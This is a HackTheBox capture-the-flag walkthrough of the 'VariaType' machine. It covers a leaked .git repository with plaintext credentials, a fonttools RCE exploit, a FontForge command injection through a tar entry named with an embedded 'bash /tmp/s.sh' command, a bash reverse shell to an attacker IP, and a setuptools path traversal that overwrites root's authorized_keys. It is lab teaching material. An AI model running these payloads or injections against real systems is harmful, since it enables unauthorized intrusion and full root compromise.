---
title: HackTheBox - VariaType
author: r2cook
categories:
  - HackTheBox
tags:
  - VariaType
  - git-dumper
  - fontforge
  - CVE-2024-25081
  - setuptools
  - CVE-2025-47273
render_with_liquid: false
media_subpath: /images/htb/VariaType/
image:
  path: room_image.png
date: 2026-04-25
---

> In this walkthrough, we compromise the HackTheBox **VariaType** machine.  
> Initial enumeration reveals a custom font processing web app and an exposed `.git` repository leaking credentials for initial access as **www-data**.  
> Further analysis of the backend pipeline leads to a **FontForge-based RCE (CVE-2024-25081)**, resulting in a shell as **steve**.  
> Privilege escalation is achieved by abusing a root-run Python installer script affected by a vulnerable `setuptools` version (CVE-2025-47273), leading to full **root compromise**.

---

## Initial Setup

First, as usual, add the target to your `/etc/hosts` file:

```plaintext
10.129.38.172 variatype.htb
```
{: file="/etc/hosts" }

---

## Enumeration

### Full Port Scan

Start with a quick scan:

```shell
$ rustscan -a variatype.htb -g
```
{: .nolineno }

Only two ports are open:

- 22 (SSH)
    
- 80 (HTTP)
    

Follow up with a more detailed scan:

```shell
$ nmap -sC -sV -Pn -T4 -p 22,80 -oA nmap/scan variatype.htb
```
{: .nolineno }

From the results:

- SSH is running (OpenSSH)
    
- The web server is nginx
    

---

## Web 80

![](web80.png){: width="800" height="400" .shadow }

The landing page shows a **Variable Font Generator**.

Clicking on `Generate Font` leads here:

![](vatiable_font_genrator.png){: width="800" height="400" .shadow }

It looks worth digging into, but enumeration comes first.

---

## Subdomain Enumeration

Next, fuzz for subdomains:

```shell
$ ffuf -u http://variatype.htb/ \
  -H "HOST: FUZZ.variatype.htb" \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  -ac -c
```
{: .nolineno }

One subdomain appears:

```text
portal
```

Add it to `/etc/hosts`:

```plaintext
10.129.38.172 variatype.htb portal.variatype.htb
```
{: file="/etc/hosts" }

---

## Portal Enumeration

![](portal_vhost.png){: width="800" height="400" .shadow }

Continue fuzzing the portal:

```shell
$ ffuf -u http://portal.variatype.htb/FUZZ \
  -w /usr/share/wordlists/custome_dirs.txt \
  -ac -c
```
{: .nolineno }

Interesting findings:

```
.git/
files/
index.php
```

The exposed `.git` directory immediately stands out 👀

---

## Dumping the Git Repo

Dump the repository locally:

```bash
$ git-dumper http://portal.variatype.htb/.git ./git
```
{: .nolineno }

Then check the commit history:

```bash
$ cd ./git && git log
```
{: .nolineno }

A couple of commits show up, so inspect them:

```shell
$ git show <commit_id>
```
{: .nolineno }

![](git_show_commit_discoverd_creds.png){: width="800" height="400" .shadow }

This reveals credentials:

```text
gitbot : G1tB0t_Acc3ss_2025!
```

Logging in with them works:

![](portal_vhost_loggedin.png){: width="800" height="400" .shadow }

---
## Shell as www-data

After some research into vulnerabilities related to the application, a promising lead appears:

**CVE-2025-66034**

An arbitrary file write vulnerability in the `fonttools varLib` module. A malicious `.designspace` file can lead to **Remote Code Execution (RCE)**.

**Impact:**  
Attackers can overwrite files, corrupt dependencies, and execute arbitrary code.

🔗 CVE: [https://nvd.nist.gov/vuln/detail/CVE-2025-66034](https://nvd.nist.gov/vuln/detail/CVE-2025-66034)  
🔗 PoC: [https://github.com/4nuxd/CVE-2025-66034](https://github.com/4nuxd/CVE-2025-66034)

First, start a listener:

```shell
$ nc -lnvp 9001
```
{: .nolineno }

Then run the exploit:

```shell
$ python3 exploit.py --ip <YOUR_IP> --port 9001 \
  --upload http://variatype.htb/tools/variable-font-generator/process \
  --webroot /var/www/portal.variatype.htb/public/files \
  --shell http://portal.variatype.htb/files \
  --no-listen
```
{: .nolineno }

The script returns a shell URL. Trigger it with curl:

```shell
$ curl 'http://portal.variatype.htb/files/f0nt_099pmnwv.php'
```
{: .nolineno }

![](shell_as_www-data.png){: width="800" height="400" .shadow }

That lands a shell as `www-data`.

---
## Shell as steve

First, stabilize the shell to make it easier to work with:

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl + Z
stty raw -echo && fg
reset
xterm
```

---

### Initial Enumeration

Start with the usual checks:

- `sudo -l` → requires a password
    
- `getcap` → nothing useful
    

Move on to manual enumeration.

Looking at `/home`, there is a user named `steve`, but access to the home directory is denied:

```shell
www-data@variatype:/home$ find / -user steve 2>/dev/null 
/home/steve
/opt/process_client_submissions.bak
www-data@variatype:/home$ 
```
{: .nolineno }

The interesting discovery here is not just the user account, but the file in `/opt`.

---

### Inspecting the File

```shell
www-data@variatype:/home$ ls -la /opt/process_client_submissions.bak
-rwxr-xr-- 1 steve steve 2018 Feb 26 07:50 /opt/process_client_submissions.bak

www-data@variatype:/home$ file /opt/process_client_submissions.bak
/opt/process_client_submissions.bak: Bourne-Again shell script, ASCII text executable

www-data@variatype:/home$ cat /opt/process_client_submissions.bak
```
{: .nolineno }

---

### The Script

```shell
#!/bin/bash
#
# Variatype Font Processing Pipeline
# Author: Steve Rodriguez <steve@variatype.htb>
# Only accepts filenames with letters, digits, dots, hyphens, and underscores.
#

set -euo pipefail

UPLOAD_DIR="/var/www/portal.variatype.htb/public/files"
PROCESSED_DIR="/home/steve/processed_fonts"
QUARANTINE_DIR="/home/steve/quarantine"
LOG_FILE="/home/steve/logs/font_pipeline.log"

mkdir -p "$PROCESSED_DIR" "$QUARANTINE_DIR" "$(dirname "$LOG_FILE")"

log() {
    echo "[$(date --iso-8601=seconds)] $*" >> "$LOG_FILE"
}

cd "$UPLOAD_DIR" || { log "ERROR: Failed to enter upload directory"; exit 1; }

shopt -s nullglob

EXTENSIONS=(
    "*.ttf" "*.otf" "*.woff" "*.woff2"
    "*.zip" "*.tar" "*.tar.gz"
    "*.sfd"
)

SAFE_NAME_REGEX='^[a-zA-Z0-9._-]+$'

found_any=0
for ext in "${EXTENSIONS[@]}"; do
    for file in $ext; do
        found_any=1
        [[ -f "$file" ]] || continue
        [[ -s "$file" ]] || { log "SKIP (empty): $file"; continue; }

        # Enforce strict naming policy
        if [[ ! "$file" =~ $SAFE_NAME_REGEX ]]; then
            log "QUARANTINE: Filename contains invalid characters: $file"
            mv "$file" "$QUARANTINE_DIR/" 2>/dev/null || true
            continue
        fi

        log "Processing submission: $file"

        if timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c "
import fontforge
import sys
try:
    font = fontforge.open('$file')
    family = getattr(font, 'familyname', 'Unknown')
    style = getattr(font, 'fontname', 'Default')
    print(f'INFO: Loaded {family} ({style})', file=sys.stderr)
    font.close()
except Exception as e:
    print(f'ERROR: Failed to process $file: {e}', file=sys.stderr)
    sys.exit(1)
"; then
            log "SUCCESS: Validated $file"
        else
            log "WARNING: FontForge reported issues with $file"
        fi

        mv "$file" "$PROCESSED_DIR/" 2>/dev/null || log "WARNING: Could not move $file"
    done
done

if [[ $found_any -eq 0 ]]; then
    log "No eligible submissions found."
fi
```
{: file="process_client_submissions.bak"}

The file is passed directly into FontForge for processing:
  
```shell  
font = fontforge.open('$file')
```
{: .nolineno }

At this stage, there is no additional validation of the file’s content before it reaches FontForge. The script simply forwards user-controlled files into the parsing process.

---

### Finding the Vulnerability Path

Searching for FontForge vulnerabilities leads to:

CVE: [https://nvd.nist.gov/vuln/detail/CVE-2024-25081](https://nvd.nist.gov/vuln/detail/CVE-2024-25081)

PoC: [https://github.com/AliElKhatteb/CVE-2024-25082_CVE-2024-25081](https://github.com/AliElKhatteb/CVE-2024-25082_CVE-2024-25081)

---

### Exploitation

#### Prepare Reverse Shell

```shell
# Write the reverse shell payload
www-data@variatype:/home$ echo 'bash -i >& /dev/tcp/<YOUR_IP>/9002 0>&1' > /tmp/s.sh
www-data@variatype:/home$ chmod +x /tmp/s.sh

# Build the malicious archive on (/var/www/portal.variatype.htb/public/files)
www-data@variatype:/var/www/portal.variatype.htb/public/files$ python3 << 'EOF'
import tarfile, io

malicious_name = "exploit.ttf;bash /tmp/s.sh;"
tar = tarfile.open("exploit.tar", "w")
info = tarfile.TarInfo(name=malicious_name)
info.size = 4
tar.addfile(info, io.BytesIO(b"AAAA"))
tar.close()
print("done")
EOF
```
{: .nolineno }

---

#### Triggering the Exploit

Once the archive is placed in:

```text
/var/www/portal.variatype.htb/public/files
```
{: .nolineno }

just wait a few seconds for the background processing to kick in.

![](shell_as_steve.png){: width="800" height="400" .shadow }

That lands a shell as `steve`, and the user flag can be retrieved:

```shell
cat /home/steve/user.txt
```
{: .nolineno }

---
## Root Shell

Checking sudo privileges reveals an interesting entry:

```shell
steve@variatype:~$ sudo -l
Matching Defaults entries for steve on variatype:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
steve@variatype:~$ 
```
{: .nolineno }

That means `steve` can run `install_validator.py` as root with a user-controlled argument.

Inspecting the script:

```python
#!/usr/bin/env python3
"""
Font Validator Plugin Installer
--------------------------------
Allows typography operators to install validation plugins
developed by external designers. These plugins must be simple
Python modules containing a validate_font() function.

Example usage:
  sudo /opt/font-tools/install_validator.py https://designer.example.com/plugins/woff2-check.py
"""

import os
import sys
import re
import logging
from urllib.parse import urlparse
from setuptools.package_index import PackageIndex

# Configuration
PLUGIN_DIR = "/opt/font-tools/validators"
LOG_FILE = "/var/log/font-validator-install.log"

# Set up logging
os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme in ('http', 'https'), result.netloc])
    except Exception:
        return False

def install_validator_plugin(plugin_url):
    if not os.path.exists(PLUGIN_DIR):
        os.makedirs(PLUGIN_DIR, mode=0o755)

    logging.info(f"Attempting to install plugin from: {plugin_url}")

    index = PackageIndex()
    try:
        downloaded_path = index.download(plugin_url, PLUGIN_DIR)
        logging.info(f"Plugin installed at: {downloaded_path}")
        print("[+] Plugin installed successfully.")
    except Exception as e:
        logging.error(f"Failed to install plugin: {e}")
        print(f"[-] Error: {e}")
        sys.exit(1)

def main():
    if len(sys.argv) != 2:
        print("Usage: sudo /opt/font-tools/install_validator.py <PLUGIN_URL>")
        print("Example: sudo /opt/font-tools/install_validator.py https://internal.example.com/plugins/glyph-check.py")
        sys.exit(1)

    plugin_url = sys.argv[1]

    if not is_valid_url(plugin_url):
        print("[-] Invalid URL. Must start with http:// or https://")
        sys.exit(1)

    if plugin_url.count('/') > 10:
        print("[-] Suspiciously long URL. Aborting.")
        sys.exit(1)

    install_validator_plugin(plugin_url)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] This script must be run as root (use sudo).")
        sys.exit(1)
    main()
```
{: file="/opt/font-tools/install_validator.py" }

### Script Analysis

The script looks restrictive at first:

- It only accepts `http://` or `https://` URLs
    
- It checks the number of `/` characters
    
- It attempts to reject suspiciously long paths
    

But the dangerous part is here:

```python
downloaded_path = index.download(plugin_url, PLUGIN_DIR)
```

It passes attacker-controlled input directly into `setuptools.package_index.PackageIndex.download()` while running as **root**.

👉 That is the suspicious part.

The script trusts `PackageIndex.download()` to safely fetch and store the file, but in the vulnerable `setuptools` version, path traversal can bypass the intended plugin directory and write files elsewhere on the system.

Check the installed version:

```shell
steve@variatype:~$ python3 -c "import setuptools; print(setuptools.__version__)"
78.1.0
```
{: .nolineno }

Researching this version leads to **CVE-2025-47273**, which confirms a **Directory/Path Traversal** issue.

CVE: [CVE-2025-47273](https://nvd.nist.gov/vuln/detail/CVE-2025-47273)  
PoC: [Github](https://github.com/AliElKhatteb/CVE-2025-47273-POC)

The plan is to use this vulnerability to overwrite root’s `authorized_keys` file with a controlled public SSH key.

---

### Prepare the SSH Key (Attacker Machine)

Generate a public key if one does not already exist:

```shell
┌──(cyperowl㉿kali)-[~/ctf/htb/VariaType]
└─$ ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa
.....
```
{: .nolineno }

Copy it into the current directory as `authorized_keys`:

```shell
┌──(cyperowl㉿kali)-[~/ctf/htb/VariaType]
└─$ cp ~/.ssh/id_rsa.pub authorized_keys
```
{: .nolineno }

Then create `python_server.py` in the current directory:

```shell
┌──(cyperowl㉿kali)-[~/ctf/htb/VariaType]
└─$ cat > python_server.py << 'EOF'
import http.server
import socketserver

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Serve authorized_keys regardless of path requested
        self.send_response(200)
        self.end_headers()
        with open("authorized_keys", "rb") as f:
            self.wfile.write(f.read())

with socketserver.TCPServer(("", 80), Handler) as httpd:
    httpd.serve_forever()
EOF
                          
┌──(cyperowl㉿kali)-[~/ctf/htb/VariaType]
└─$ python3 python_server.py
```
{: .nolineno }

This serves the public key over HTTP.

---

### Exploitation

Move back to the target machine:

```shell
steve@variatype:~$ ATTACKER_IP="YOUR_IP"        
steve@variatype:~$ TARGET_USER="root"
steve@variatype:~$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py "http://${ATTACKER_IP}/%2f${TARGET_USER}%2f.ssh%2fauthorized_keys#egg=evil-1.0"

2026-04-24 19:52:20,514 [INFO] Attempting to install plugin from: http://10.10.17.25/%2froot%2f.ssh%2fauthorized_keys#egg=evil-1.0
2026-04-24 19:52:20,525 [INFO] Downloading http://10.10.17.25/%2froot%2f.ssh%2fauthorized_keys#egg=evil-1.0
2026-04-24 19:52:21,105 [INFO] Plugin installed at: /root/.ssh/authorized_keys
[+] Plugin installed successfully.
```
{: .nolineno }

The traversal causes the downloaded file to be written to:

```text
/root/.ssh/authorized_keys
```

At that point, the public key is placed in root’s SSH authorized keys file.

Now SSH in as root without a password and get a root shell.

![](root_shell.png){: width="800" height="400" .shadow }